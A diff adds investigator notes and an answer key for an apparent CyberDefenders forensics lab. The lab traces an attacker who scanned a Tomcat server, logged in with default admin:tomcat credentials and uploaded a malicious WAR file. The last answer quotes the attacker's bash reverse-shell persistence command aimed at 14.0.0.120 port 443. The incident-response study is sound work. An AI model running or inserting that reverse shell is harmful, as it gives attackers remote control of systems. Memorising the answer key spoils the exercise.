@@ -1,0 +1,52 @@
+- Top IPs
+14.0.0.120
+10.0.0.112 - SSH Server & Apache Tomcat/7.0.88
+10.0.0.115 - CyberDefenders - Virtual-Machine - Account: root - OS: Ubuntu
+10.0.0.105 - SMB/File Share Server
+
+- Top Ports
+8080
+22
+445
+80
+443
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+14.0.0.120 is sending a ton of SYN requests, this is a clear indicator of a SYN scan
+14.0.0.120 Scanned the SSH Server and found ports 8080, 22, and 8009 are open
+
+@18:22:14, 14.0.0.120 Uploaded (POST) PK File to Tomcat Server, Most likely a ZIP 
+On packet 20553, there was a successful login for admin:tomcat (Most likely unchanged default credentials)
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?
+(14.0.0.120)
+
+
+Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?
+(Guangzhou)
+
+
+From the pcap analysis, multiple open ports were detected as a result of the attacker's activitie scan. Which of these ports provides access to the web server admin panel?
+(8080)
+
+Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?
+(gobuster)
+
+
+Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?
+(/manager)
+
+
+Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?
+(admin:tomcat)
+
+
+
+Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?
+(JXQOZY.war)
+
+
+Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?
+(/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1')
